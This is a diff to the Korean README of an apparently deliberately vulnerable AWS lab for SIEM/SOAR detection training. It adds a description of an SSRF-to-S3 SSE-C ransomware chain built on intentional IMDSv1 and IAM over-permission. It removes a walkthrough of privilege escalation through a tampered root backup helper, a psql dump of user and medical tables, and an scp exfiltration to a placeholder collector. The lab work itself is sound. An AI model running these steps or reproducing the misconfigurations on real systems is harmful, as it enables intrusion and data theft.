@@ -3,10 +3,25 @@
 `vuln-hospital-booking` 앱을 위한 AWS 인프라를 Terraform으로 구성합니다.
 SIEM/SOAR 실습을 위해 **의도적으로 취약하게** 구성된 환경이며, 공격 시뮬레이션 및 탐지 파이프라인 실습 용도입니다.
 
+## 프로젝트 구조
+
+```
+modules/
+  networking/            VPC · 서브넷 · IGW · 보안그룹
+  app/                   WEB EC2 · RDS · Document S3 · WAF
+  wazuh/                 Wazuh 매니저 EC2 · 커스텀 룰/디코더
+  shuffle/                Shuffle(SOAR) EC2
+  c2/                     공격자 C2 EC2
+  security_monitoring/    CloudTrail · VPC Flow Logs · Logs S3 · GuardDuty(`enable_guardduty`로 끌 수 있음)
+main.tf                   위 모듈을 조립하는 루트 구성
+terraform.tfvars          실제 값 입력 (git 추적 제외)
+ssh/                      유출 SSH 키 실습용 키페어
+```
+
 ## 주의사항
 
 - 이 인프라는 **보안 실습 전용**이며 프로덕션 사용을 금지합니다.
-- GuardDuty, CloudTrail은 과금이 발생합니다 — 실습 후 반드시 `terraform destroy` 하세요.
+- GuardDuty(기본값 활성화), CloudTrail은 과금이 발생합니다 — 실습 후 반드시 `terraform destroy` 하세요. `enable_guardduty = false`로 끌 수 있습니다.
 - EC2 보안그룹의 `0.0.0.0/0` SSH 허용은 의도적 취약 설정입니다 (`modules/networking/main.tf` 참고).
 - RDS는 VPC 내부에서만 접근 가능하며 퍼블릭 노출이 없습니다.
 
@@ -37,7 +52,9 @@ terraform apply
 terraform destroy
 ```
 
-`terraform.tfvars`의 `key_pair_name`, `db_password`는 `<CHANGE_ME>`를 실제 값으로 교체한 뒤 실행하세요.
+`terraform.tfvars`는 `.gitignore`에 포함되어 있어 직접 생성해야 합니다. 기본값이 없는 변수
+(`key_pair_name`, `db_password`, `c2_lab_token`, `shuffle_admin_password`, `shuffle_encryption_modifier`,
+`shuffle_opensearch_password`)는 반드시 채워야 `apply`가 됩니다.
 
 ## 앱 배포 동작
 
@@ -76,6 +93,21 @@ nc -vz -w 3 <EC2_PUBLIC_IP> 5433
 
 SQLi 요청은 `403 Forbidden`과 `X-Request-ID`가 포함된 커스텀 차단 페이지가 기대값입니다.
 
+## SSRF 기반 랜섬웨어 침해 실습
+
+이 인프라는 앱 EC2에 SSRF → EC2 임시 자격증명 탈취 → S3 SSE-C 랜섬웨어까지 이어지는 체인이 가능하도록
+의도적으로 과다 권한과 취약 설정을 함께 구성합니다.
+
+구성 요소:
+
+- `metadata_options`(`http_tokens = "optional"`): IMDSv1을 허용해 SSRF만으로 토큰 없이 임시 자격증명을 조회 가능
+- EC2 IAM Role(`ec2_ssm`): `AmazonS3FullAccess`를 통째로 부여(의도적 과다 권한) + 자기 role 정책 열람·계정 전체 버킷 열거 권한 — 탈취한 자격증명만으로 반출부터 SSE-C 재암호화, lifecycle 삭제 설정까지 전체 체인 수행 가능
+- Document S3 버킷(`documents`): 기본 서버측 암호화를 걸지 않음(SSE-C 업로드를 막는 AWS `BlockedEncryptionTypes` 정책 회피 목적) + 버저닝은 켜져 있지만 lifecycle로 이전 버전까지 삭제 가능
+- C2 EC2(`modules/c2`): 재암호화한 문서를 반출받는 대상 서버
+
+실습 커맨드는 Notion 문서를 참고하세요.
+https://app.notion.com/p/SSRF-to-S3-SSE-C-Ransomware-Attack-Chain-PoC-3ababddcd58880cf9202eb18be524d89
+
 ## 유출 SSH 키 기반 EC2 침해 실습
 
 이 인프라는 앱 EC2에 유출 SSH 키 시나리오용 `deploy` 계정과 의도적으로 취약한 root 백업 작업을 함께 구성합니다.
@@ -90,92 +122,10 @@ SQLi 요청은 `403 Forbidden`과 `X-Request-ID`가 포함된 커스텀 차단 �
 - `/etc/vuln-hospital-booking/app.env`: root만 읽을 수 있는 DB/S3 앱 설정
 - auditd/Wazuh FIM: 정찰 명령, 백업 경로 조사, 헬퍼 변조, root 표식 파일, 설정 복사, 수집/압축/전송/삭제 행위 감시
 
-초기 접근:
+실습 커맨드는 Notion 문서를 참고하세요.
+https://app.notion.com/p/SSH-EC2-POC-3b6abddcd58880d3bbafc25ff184736b
 
-```bash
-ssh -i ssh/vuln-hospital-lab.pem deploy@<APP_EC2_PUBLIC_IP>
-```
+## Wazuh 탐지 룰
 
-정찰 및 취약 경로 확인:
-
-```bash
-whoami
-id
-groups
-sudo -l
-hostname
-uname -a
-ip addr
-docker compose ps
-systemctl list-timers --all
-systemctl cat hospital-db-backup.timer
-systemctl cat hospital-db-backup.service
-ls -l /usr/local/sbin/hospital-db-backup.sh
-ls -ld /opt/hospital/bin
-ls -l /opt/hospital/bin/hospital-backup-helper
-namei -l /opt/hospital/bin/hospital-backup-helper
-```
-
-권한 상승 검증용 헬퍼 변조 예시:
-
-```bash
-cp /opt/hospital/bin/hospital-backup-helper /opt/hospital/bin/hospital-backup-helper.orig
-cat > /opt/hospital/bin/hospital-backup-helper <<'EOF'
-#!/usr/bin/env bash
-set -euo pipefail
-mkdir -p /tmp/wazuh-edr-lab
-id > /tmp/wazuh-root-proof
-cp /etc/vuln-hospital-booking/app.env /tmp/wazuh-edr-lab/app.env
-chmod 644 /tmp/wazuh-root-proof /tmp/wazuh-edr-lab/app.env
-exec /opt/hospital/bin/hospital-backup-helper.orig
-EOF
-chmod 775 /opt/hospital/bin/hospital-backup-helper
-```
-
-다음 타이머 실행까지 남은 시간을 확인한 뒤 기다립니다.
-
-```bash
-systemctl list-timers hospital-db-backup.timer
-```
-
-검증 파일:
-
-```bash
-cat /tmp/wazuh-root-proof
-cat /tmp/wazuh-edr-lab/app.env
-```
-
-DB 조회와 수집/압축/전송 테스트는 실습용 더미 데이터만 대상으로 수행합니다.
-
-```bash
-set -a
-. /tmp/wazuh-edr-lab/app.env
-set +a
-mkdir -p /tmp/wazuh-edr-lab-collection
-PGPASSWORD="$DATABASE_PASSWORD" psql -h "$DATABASE_HOST" -U "$DATABASE_USER" -d "$DATABASE_NAME" \
-  -c "\\copy (select id, username, full_name, email, role from users) to '/tmp/wazuh-edr-lab-collection/users.csv' csv header"
-PGPASSWORD="$DATABASE_PASSWORD" psql -h "$DATABASE_HOST" -U "$DATABASE_USER" -d "$DATABASE_NAME" \
-  -c "\\copy (select id, status, reason, created_at from appointments) to '/tmp/wazuh-edr-lab-collection/appointments.csv' csv header"
-PGPASSWORD="$DATABASE_PASSWORD" psql -h "$DATABASE_HOST" -U "$DATABASE_USER" -d "$DATABASE_NAME" \
-  -c "\\copy (select id, title, document_type, classification, file_path from medical_documents) to '/tmp/wazuh-edr-lab-collection/medical_documents.csv' csv header"
-tar -czf /tmp/wazuh-edr-lab-collection.tar.gz -C /tmp wazuh-edr-lab-collection
-```
-
-외부 수집 서버가 있을 때만 반출 이벤트를 생성합니다.
-
-```bash
-scp /tmp/wazuh-edr-lab-collection.tar.gz <collector_user>@<collector_ip>:/tmp/
-```
-
-주요 커스텀 Wazuh 룰 ID:
-
-- `100170`: 계정/시스템 정찰 명령
-- `100171`: 백업 타이머 및 root 서비스 조사
-- `100172`: `/opt/hospital/bin/hospital-backup-helper` FIM 변경
-- `100173`: `/tmp/wazuh-root-proof` root 권한 표식
-- `100174`: root 전용 앱 설정 접근 또는 `/tmp` 스테이징
-- `100175`: PostgreSQL 데이터 조회/수집
-- `100176`: `/tmp` 수집 데이터 압축
-- `100177`: `scp`, `curl`, `nc` 기반 반출 시도
-- `100178`: 수집물 또는 셸 히스토리 삭제 시도
-- `100179`: root 표식 이후 민감 설정 접근 상관분석
+SSRF·SSE-C·SSH 침해 시나리오별 커스텀 룰 ID, 레벨, MITRE 매핑, SOAR 자동 대응 연동은
+[`WAZUH_RULES.md`](WAZUH_RULES.md)에 정리되어 있습니다.
